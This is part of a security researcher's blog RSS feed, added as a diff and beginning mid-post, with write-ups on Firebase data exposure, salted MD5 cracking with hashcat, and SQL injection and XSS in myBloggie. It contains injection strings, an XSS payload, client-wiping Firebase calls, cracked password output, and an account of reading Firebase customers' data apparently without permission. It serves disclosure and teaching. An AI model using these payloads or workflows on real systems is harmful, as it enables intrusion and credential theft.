+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;$(&#39;#foo,body&#39;).text(...)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So we are setting the content of #foo (does not exist) and &amp;lt;body&amp;gt; (does exist). The whole body is now replaced! Let&amp;rsquo;s revert this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;userListRef.child(&amp;quot;foo,body&amp;quot;).remove();
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Which is executed in the following lines on the client:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;userListRef.on(&amp;quot;child_removed&amp;quot;, function(snapshot) {
+    $(&amp;quot;#&amp;quot; + snapshot.name()).remove();
+});
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Oh, we just removed the &amp;lt;body&amp;gt; off all ours clients..&lt;/p&gt;
+
+&lt;p&gt;Sadly (for us) Firebase used jQuery 1.9, which is not affected by the selector xss bug. Otherwise we could have executed code to all other users with this simple line:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;userListRef.child(&amp;quot;foo,&amp;lt;img src=x onerror=alert(1)&amp;gt;&amp;quot;).set({name:1})
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;checking-firebase-customers&#34;&gt;Checking Firebase customers&lt;/h3&gt;
+
+&lt;p&gt;As I mentioned above, Firebase allows users to add &lt;a href=&#34;https://www.firebase.com/docs/security/security-rules.html&#34;&gt;security rules&lt;/a&gt; to restrict access. However, I had a quick look at some of their listed Customers to inspect if they are using their security rules correct.&lt;/p&gt;
+
+&lt;p&gt;I just checked some customers which are using Firebase before I need to register to their service, so I could have a quick look at their setup.&lt;/p&gt;
+
+&lt;p&gt;After I found the Firebase-Reference on the first page, I opened my dev console and tried to attach to their data. I&amp;rsquo;ve never access user data so easy..&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://robinverton.de/static/firebase-1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So lets check a second customer listed on their Customers page:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://robinverton.de/static/firebase-2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;While it is super easy and fast to develop apps with firebase, it looks like some developers do not take the extra effort to set up security rules. Maybe Firebase should take the initiative and &lt;em&gt;require&lt;/em&gt; security rules to be set.&lt;/p&gt;
+
+&lt;p&gt;Replacing your backend with a cloud backend is a nice way to go. But keep in mind that you do not only have to validate data coming from the client. You also should validate data coming from your data store now. And please do not forget to set up rules, because making data not visible to the user is not the same as restricting access to the data, especially when we are talking about a client accessible data storage.&lt;/p&gt;
+
+&lt;p&gt;Note: I already contacted Firebase and one of their customers regarding the issues a few days ago. The second page had no contact information.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Drupal Security Scanner</title>
+      <link>http://robinverton.de/blog/2012/10/23/drupal-security-scanner/</link>
+      <pubDate>Tue, 23 Oct 2012 15:52:05 +0100</pubDate>
+      
+      <guid>http://robinverton.de/blog/2012/10/23/drupal-security-scanner/</guid>
+      <description>
+
+&lt;h3 id=&#34;dpscan-py-to-drupalscan&#34;&gt;DPscan.py to DrupalScan&lt;/h3&gt;
+
+&lt;p&gt;Recently I was in the need of a simple &amp;ldquo;drupal security scanner&amp;rdquo; which enumerates all modules of a drupal project so I can do a source code audit on them.
+The only thing I could found for this were some you-have-to-be-a-member sites and a script called WPscan.py. Because the author&amp;rsquo;s site of the script was not accessible I decided to write an own little tool in ruby which can be easily plugged into another project I&amp;rsquo;m currently realising.&lt;/p&gt;
+
+&lt;h3 id=&#34;drupalscan&#34;&gt;DrupalScan&lt;/h3&gt;
+
+&lt;p&gt;DrupalScan can be installed via rubygems:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ gem install DrupalScan
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You can also find &lt;a href=&#34;http://github.com/rverton/DrupalScan&#34;&gt;this project on github&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;After installation you can use it directly in the command line or by requiring the lib.&lt;/p&gt;
+
+&lt;h3 id=&#34;command-line-usage&#34;&gt;Command Line Usage&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ DrupalScan -h                  
+Usage: DrupalScan &amp;lt;url&amp;gt; [--no-module-lookup]
+    -u, --url URL                    URL of drupal project. Example: http://drupal.org
+    -n, --no-module-lookup           Disable module lookup on drupal.org
+    -h, --help                       Show this help
+$ DrupalScan -u http://drupal.org
+Version: Drupal 6.26, 2012-05-02
+Found &#39;flot&#39;
+ -&amp;gt; This module provides an API and views integration for using the flot graphing library. It is designed to make it simple to add flot graphs or charts, it supports line, bar and pie charts.http://drupal.org/project/flot
+
+Found &#39;drupalorg&#39;
+ -&amp;gt; Customizations used on drupal.org itself.  It is not meant to be useful to other sites, except as an educational example of the kinds of modifications you can make via a site-specific module.http://drupal.org/project/drupalorg
+
+Found &#39;token&#39;
+ -&amp;gt; Tokens are small bits of text that can be placed into larger documents via simple placeholders, like %site-name or [user]. The Token module provides a central API for modules to use these tokens, and expose their own token values.http://drupal.org/project/token
+
+Found &#39;httpbl&#39;
+ -&amp;gt; Implementation of http:BL for Drupal. http:BL can prevent email address harvesters and comment spammers from visiting your site by using a centralized DNS blacklist. It requires a free Project Honey Pot membership. This module provides efficient blacklist lookups and blocks malicious visitors effectively.http://drupal.org/project/httpbl
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;using-drupalscan-in-your-own-script&#34;&gt;Using DrupalScan in your own script&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;require &#39;DrupalScan&#39;
+version = DrupalScan::getVersion(&amp;quot;http://drupal.org&amp;quot;)
+modules = DrupalScan::enumerateModules(&amp;quot;http://drupal.org&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Feel free to fork.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Cracking salted MD5 with Hashcat</title>
+      <link>http://robinverton.de/blog/2012/07/15/cracking-salted-md5-with-hashcat/</link>
+      <pubDate>Sun, 15 Jul 2012 15:49:36 +0100</pubDate>
+      
+      <guid>http://robinverton.de/blog/2012/07/15/cracking-salted-md5-with-hashcat/</guid>
+      <description>
+
+&lt;p&gt;Some days ago during a pentest I found a critical sql injection vulnerability which gave me access to the user database. Most of the time finding this kind of vulnerability and extracting some data from the database is enough as an proof of concept, but in this particular pentest I needed to gain access to the backend administration.&lt;/p&gt;
+
+&lt;p&gt;Sadly there was no way to insert data into the user table so it was not possible to create an admin account for me. I decided to dump a few entries from the user table and take a look at the encryption. The user table was in the format&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# Database dump (format)
+USERNAME;EMAIL;RIGHTS;SALT;HASH
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;# Example row
+john;john@foo.com;admin;OPHQOEF;U04b5bbcf6570b3172657c4c93f2a28eb
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;cutting-for-hashcat&#34;&gt;Cutting for hashcat&lt;/h3&gt;
+
+&lt;p&gt;It was pretty obvious that the password was hashed with MD5, so there was no need to run it through hash_id.py.
+The first thing I had to do was to bring it to the right format to pass it to hashcat:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;rv% cat /security/220812_db_dump | awk &amp;quot;-F;&amp;quot; &#39;{print $5 &amp;quot;:&amp;quot; $4}&#39; &amp;gt; /security/blog_crackme
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;em&gt;Note: The awk -F argument specifies the field seperator (in our case the &amp;lsquo;;&amp;rsquo; which seperates our columns).&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Our list is now in the format &lt;em&gt;hash:salt&lt;/em&gt; so we can now pass it to hashcat:&lt;/p&gt;
+
+&lt;h3 id=&#34;crack-it&#34;&gt;Crack it&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;rv% ./hashcat-cli64.app -m 10 -a 0 /security/blog_crackme /security/wordlist
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;-m 10&lt;/strong&gt; specifies the hash-type. Running &amp;ndash;help will print you a full list of supported types. Because I guessed that it&amp;rsquo;s a simple $salt + $pass or $pass + $salt there were only two suitable candidates:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;10 = md5($pass.$salt)
+20 = md5($salt.$pass)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;-a 0&lt;/strong&gt; defines the attack mode. There are six modes which you can choose one from:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;0 = Straight (just the word found in $wordlist: foobar)
+1 = Combination (words combinated: foobar)
+2 = Toggle-Case (toggled case: Foobar, FOobar, FOObar, ...)
+3 = Brute-force (tries all combinations from a given keyspace)
+4 = Permutation (permutations like abc, acb, bac, ...)
+5 = Table-Lookup (read [here](http://hashcat.net/wiki/doku.php?id=table_lookup_attack))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I choosed &lt;em&gt;0&lt;/em&gt; to do a straight attack. One account was all I needed so I hoped for a fast result through my wordlist.&lt;/p&gt;
+
+&lt;h3 id=&#34;results&#34;&gt;Results&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;rv% ./hashcat-cli64.app -m 10 -a 0 /security/blog_crackme /security/wordlist
+Initializing hashcat v0.40 by atom with 8 threads and 32mb segment-size...
+
+NOTE: press enter for status-screen
+
+Added hashes from file /security/blog_crackme: 38 (38 salts)
+65ae1d0cf8e9634e49da735708a75171:DAQLHMBM:1980
+63208de564208a200f473c61a62b902a:QXYDVONY:sunshine
+82bcf418ec8e4139e0331e49e40d73c9:NWTWIXNJ:blablabla
+Input.Mode: Dict (/security/wordlist)
+Index.....: 1/1 (segment), 2854263 (words), 31746845 (bytes)
+Recovered.: 3/38 hashes, 3/38 salts
+Speed/sec.: 13.96M plains, 398.73k words
+Progress..: 2854263/2854263 (100.00%)
+Running...: 00:00:00:07
+Estimated.: --:--:--:--
+Started: Mon Aug 27 11:09:08 2012
+Stopped: Mon Aug 27 11:09:15 2012
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Luckily my first guess with the hash type ($pass + $salt) was the right one so I got some great results. I was able to login with the cracked credentials. Mission complete ;-)&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>EPLUS Group (mobile network operator) security issue (SMS flood, MSISDN verification)</title>
+      <link>http://robinverton.de/blog/2011/11/16/eplus-group-mobile-network-operator-security-issue-sms-flood-msisdn-verification/</link>
+      <pubDate>Wed, 16 Nov 2011 15:48:45 +0100</pubDate>
+      
+      <guid>http://robinverton.de/blog/2011/11/16/eplus-group-mobile-network-operator-security-issue-sms-flood-msisdn-verification/</guid>
+      <description>&lt;p&gt;Some months ago (16th of Sep.) I found a security issue on an EPLUS service page,
+which allows you to send as much SMS as you want to their customers (only numbers from the EPLUS group are affected) with a special message.&lt;/p&gt;
+
+&lt;p&gt;During my tests I found that the only limit you are faced with in sending SMS is the bandwidth of your connection/their server. The SMS is send
+by a service hotline number and can not be traced back to you. The SMS-sending is triggered by a simple GET-request to their server.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://robinverton.de/static/eplus-sms-1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Because I could not find any suitable address for security related issues (or in other words: sadly there is no address for topics like this), I had to write several emails to their customer support to get an response so my findings were forwarded.&lt;/p&gt;
+
+&lt;p&gt;A few weeks later I received a phone call from a member of their technical service. He told me that I was absolutely right and that they are going to have a closer look on my findings. Two months have passed now, and except of a 5€ gift card I received (wow!), nothing happened. I will keep an eye on this and post additional informations on this issue when their team released a fix.&lt;/p&gt;
+
+&lt;p&gt;For the sake of completeness I also found a XSS vulnerability on their page. To make sure I will not overload their technical team with work I will wait to send this issue until they fixed the first one :]&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt;: It is also possible to figure out if a given mobile number (MSISDN) inside the eplus network is valid or not. This is a big issue because spammers can guess all possible variations of mobile numbers, check if they are valid and make a list of correct numbers. (Note: According to &lt;a href=&#34;http://en.wikipedia.org/wiki/E-Plus&#34;&gt;wikipedia&lt;/a&gt;, the eplus group has about 22.1 million subscribers!)&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Simple GET/POST Crawler (Python)</title>
+      <link>http://robinverton.de/blog/2011/06/30/simple-get/post-crawler-python/</link>
+      <pubDate>Thu, 30 Jun 2011 15:47:08 +0100</pubDate>
+      
+      <guid>http://robinverton.de/blog/2011/06/30/simple-get/post-crawler-python/</guid>
+      <description>&lt;p&gt;Some weeks ago I wrote a little tool to support me when analysing webpages. The python tool recursive crawls all links from a page, collects the GET-Parameter and filters out the FORM-Data. Simple!
+The actual crawling- and parsing-method is located in the &lt;em&gt;LinkCrawler.py&lt;/em&gt; which makes use of the &lt;a href=&#34;http://www.crummy.com/software/BeautifulSoup/&#34;&gt;BeautifulSoup&lt;/a&gt; library. You can easily include it in your own scripts:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;links =	 LinkCrawler.LinkCrawler(url, layer=1, quiet=False)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I also added a little script to use it as a command line tool:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;python rAnlyzr.py -u &amp;lt;url&amp;gt; [-l layer] [-q]
+
+-u &amp;lt;url&amp;gt;		Specifies the URL. Format: http://example.com/
+-l &amp;lt;layer&amp;gt;		Layers to crawl. Default = 1
+-q				Quiet. Do not print crawled URL&#39;s
+-h				Print this help
+
+Example: python rAnlyzr.py -u http://robinverton.de/
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Example Output:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ python rAnlyzr.py -u robinverton.de -q
+#########################################
+# rAnzlyr v0.1 - Simple GET/POST Filter	#
+# Jun. 2011 - Robin Verton    				  #
+# http://robinverton.de				      	  #
+#########################################
+
+- /blog/
+- /blog/hello-blog
+- /hireme
+- /blog/advanced-insert-into-injection-by-taking-advantage-of-the-primary-key
+- /blog/recent.atom
+- /blog/category/it-security
++ P /imprint
++	csrf
++	name
++	email
++	submit
+- /whatido
+- /
+- /blog/category/other
+- /blog/category/penetrationtesting
++ P /blog/addcomment/2
++	csrf
++	author_name
++	author_email
++	author_web
++	submit
++ P /blog/addcomment/3
++	csrf
++	author_name
++	author_email
++	author_web
++	submit
+- /blog/mybloggie-2-1-6-sql-injection-persistent-xss
+- /blog/category/advisories-publications
++ P /blog/addcomment/1
++	csrf
++	author_name
++	author_email
++	author_web
++	submit
+- /imprint
+- /blog/category/python-tools
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Note: P indicates a FORM&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Download &lt;a href=&#34;http://robinverton.de/static/files/rAnlyzr_v0.1.tar.gz&#34; title=&#34;rAnlyzr_v0.1&#34;&gt;here&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Advanced INSERT INTO Injection by Taking Advantage of the Primary Key</title>
+      <link>http://robinverton.de/blog/2011/06/15/advanced-insert-into-injection-by-taking-advantage-of-the-primary-key/</link>
+      <pubDate>Wed, 15 Jun 2011 15:43:42 +0100</pubDate>
+      
+      <guid>http://robinverton.de/blog/2011/06/15/advanced-insert-into-injection-by-taking-advantage-of-the-primary-key/</guid>
+      <description>
+
+&lt;h3 id=&#34;the-idea&#34;&gt;The idea&lt;/h3&gt;
+
+&lt;p&gt;I recently found a security issue in myBloggie. Injeting malicious code into the SQL-statement was quite simple, the only thing you had to do is to bypass the URL-validation regex by submitting a real url merged with an injection string:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;// [...] functions.php - line 750-762
+function validate_url($url) {
+	if ( ! preg_match(&#39;#^http\\:\\/\\/[a-z0-9\-]+\.([a-z0-9\-]+\.)?[a-z]+#i&#39;, $url, $matches) ) {
+		return false;
+	} else {
+		return true;  
+	}
+} 
+// [...]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;As you can see the regular expression defines the beginning (&lt;em&gt;^&lt;/em&gt;), the url (&lt;em&gt;http&amp;hellip;) but misses to define the end (&lt;/em&gt;$*) of the passed &lt;em&gt;$url&lt;/em&gt;, thus resulting in an possible injection of malicious code:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;trackback.php?foo=bar&amp;amp;url=http://example.com&#39;Injetion
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The whole SQL-statement with the injected string now looks something like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;INSERT INTO &amp;quot;.COMMENT_TBL.&amp;quot; SET
+    post_id=&#39;$tb_id&#39;, 
+    comment_subject=&#39;$title&#39;, 
+    comments=&#39;$excerpt&#39;, 
+    com_tstamp=&#39;$timestamp&#39; ,
+    poster = &#39;$blog_name&#39;, 
+    home=&#39;http://example.com&#39;Injetion 
+    comment_type=&#39;trackback&#39;;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I wondered how this can be exploited and thought of sending several requests and playing with the primary key.&lt;/p&gt;
+
+&lt;h3 id=&#34;taking-advantage-of-the-primary-key&#34;&gt;Taking advantage of the primary key&lt;/h3&gt;
+
+&lt;p&gt;Now we come to the tricky part.. The home-field is the next to last field so the only field we can inject some data in is the &lt;em&gt;comment_type&lt;/em&gt; field which is not printed out. What a pity! Using some injection string like&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;http://example.com&#39;, comments=&#39;this is the comment text&#39;/**
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;does not work because (My-)SQL does not allow to set the value of fields which were already set before (e.g. &lt;em&gt;comments&lt;/em&gt; is set to $excerpt some lines above).&lt;br /&gt;
+What can we do now?&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s take a look at the database scheme:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://robinverton.de/static/advanced-sqli-1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;comment_id&lt;/em&gt; is the primary key. Because it is auto incremented, it is not set in the SQL-query above. Just keep this in mind!&lt;/p&gt;
+
+&lt;p&gt;To print out the data we want, we have to inject it into some of the fields which are printed out: &lt;em&gt;comment_subject&lt;/em&gt;, &lt;em&gt;comments&lt;/em&gt;, &lt;em&gt;poster&lt;/em&gt; or &lt;em&gt;home&lt;/em&gt;. Because we can not set the already defined fields we have to find another way to do this.&lt;/p&gt;
+
+&lt;p&gt;A MySQL-Function came to my mind which allows us to update content inside an INSERT INTO statement, called &lt;strong&gt;ON DUPLICATE KEY UPDATE&lt;/strong&gt; :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;INSERT INTO table (foo, bar) VALUES (bar, foo) ON DUPLICATE KEY UPDATE foo=&#39;update value&#39;;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;MySQL definition:
+&lt;em&gt;If you specify ON DUPLICATE KEY UPDATE, and a row is inserted that would cause a duplicate value in a UNIQUE index or PRIMARY KEY, an UPDATE of the old row is performed.&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;As you can see in the blog SQL-query the primary key (&lt;em&gt;comment_id&lt;/em&gt;) is not set because it is auto incremented, so it&amp;rsquo;s not necessary to specify it. This is the point where we dive in now: We can set the comment_id because it is not already set. If we insert an comment_id which is already set and we re-send this query, &lt;strong&gt;ON DUPLICATE KEY UPDATE&lt;/strong&gt; will update every field we want to. Great!&lt;br /&gt;
+The finally sql query should now look something like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;INSERT INTO &amp;quot;.COMMENT_TBL.&amp;quot; SET
+    post_id=&#39;$tb_id&#39;, 
+    comment_subject=&#39;$title&#39;, 
+    comments=&#39;$excerpt&#39;, 
+    com_tstamp=&#39;$timestamp&#39; ,
+    poster = &#39;$blog_name&#39;, 
+    home=&#39;http://example.com&#39;, comment_id=1234 # 1 # ON DUPLICATE KEY 
+    UPDATE comments=&#39;malicious code&#39;/**
+    comment_type=&#39;trackback&#39;;												# 2 #
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In &lt;strong&gt;1&lt;/strong&gt; we define the primary key, in &lt;strong&gt;2&lt;/strong&gt; we set the field which should be updated of an duplicated primary key occurs.&lt;br /&gt;
+The last thing we have to do now is&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;find a comment_id which is already used or&lt;/li&gt;
+&lt;li&gt;because we can control the comment_id we can first insert an &amp;lsquo;dummy&amp;rsquo;-comment with the id X and later update this entry.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;example-workflow&#34;&gt;Example workflow:&lt;/h3&gt;
+
+&lt;p&gt;All we have to do is sent two request, one by one, to get the duplicate primary key thus resulting in an update of the row:&lt;/p&gt;
+
+&lt;h4 id=&#34;step-1&#34;&gt;Step 1&lt;/h4&gt;
+
+&lt;p&gt;url=&lt;a href=&#34;http://example.com&#39;&#34;&gt;http://example.com&#39;&lt;/a&gt;, comment_id=1234/**&lt;/p&gt;
+
+&lt;h4 id=&#34;step-2&#34;&gt;Step 2&lt;/h4&gt;
+
+&lt;p&gt;url=&lt;a href=&#34;http://example.com&#39;&#34;&gt;http://example.com&#39;&lt;/a&gt;, comment_id=1234 ON DUPLICATE KEY UPDATE comments=&amp;lsquo;malicious code&amp;rsquo;/**&lt;/p&gt;
+
+&lt;p&gt;Well done, we successfully injected our string now into a printed field. Of course you can choose whatever field you want to for updating.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>myBloggie 2.1.6 SQL Injection and Persistent XSS</title>
+      <link>http://robinverton.de/blog/2011/06/01/mybloggie-2.1.6-sql-injection-and-persistent-xss/</link>
+      <pubDate>Wed, 01 Jun 2011 15:38:12 +0100</pubDate>
+      
+      <guid>http://robinverton.de/blog/2011/06/01/mybloggie-2.1.6-sql-injection-and-persistent-xss/</guid>
+      <description>
+
+&lt;h3 id=&#34;information&#34;&gt;Information&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;Software:&lt;/strong&gt; myBloggie 2.1.6&lt;br /&gt;
+&lt;strong&gt;Severity:&lt;/strong&gt; High&lt;br /&gt;
+&lt;strong&gt;Author:&lt;/strong&gt; Robin Verton
+&lt;strong&gt;Date:&lt;/strong&gt; Jun. 12 2011&lt;br /&gt;
+&lt;strong&gt;Vendor:&lt;/strong&gt; &lt;a href=&#34;http://mybloggie.mywebland.com/&#34;&gt;http://mybloggie.mywebland.com/&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;software-description&#34;&gt;Software Description&lt;/h3&gt;
+
+&lt;p&gt;&amp;ldquo;myBloggie is considered one of the most simple, user-friendliest yet packed with features Weblog system available to date.&amp;rdquo;&lt;/p&gt;
+
+&lt;h3 id=&#34;issue-details&#34;&gt;Issue details&lt;/h3&gt;
+
+&lt;p&gt;myBloggie 2.1.6 is - again - prone to a SQL-Injection vulnerability in the trackback function. It is possible to add a malformed URL to a trackback so malicious code can be injected to insert/read out data from the database.&lt;/p&gt;
+
+&lt;p&gt;An unsafe regular expression which does not properly check the passed trackback-url can be bypassed to inject malicious data into an INSERT INTO statement, resulting in an persistent cross-site-scripting or be used for reading out sensitive data (see &amp;lsquo;Advanced INSERT INTO exploitation by taking advantage of the primary key&amp;rsquo; described here [1]).&lt;/p&gt;
+
+&lt;h3 id=&#34;technical-details&#34;&gt;Technical details&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;// php trachback.php - line 33-35
+$url=urldecode($_REQUEST[&#39;url&#39;]);
+if (validate_url($url)==false) { $tback-&amp;gt;trackback_reply(1, &amp;quot;&amp;lt;p&amp;gt;Sorry, Trackback failed.. Reason : URL not valid&amp;lt;/p&amp;gt;&amp;quot;); }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;//php functions.php - line 750
+function validate_url($url) {
+	if ( ! preg_match(&#39;#^http\\:\\/\\/[a-z0-9\-]+\.([a-z0-9\-]+\.)?[a-z]+#i&#39;, $url, $matches) ) {
+		return false;
+	} else {
+		return true;  
+	}
+} 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;As you can see the end of the passed &lt;em&gt;$url&lt;/em&gt; in the regular expression is not defined. By providing an URL like&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;http://example.com&#39;INJECTION
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;the validation can be bypassed.&lt;/p&gt;
+
+&lt;h3 id=&#34;timeline&#34;&gt;Timeline&lt;/h3&gt;
+
+&lt;p&gt;Jul 12 2011 - Bug found.&lt;br /&gt;
+Jul 12 2011 - Vendor contacted.&lt;br /&gt;
+Jul 15 2011 - Full disclosure.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
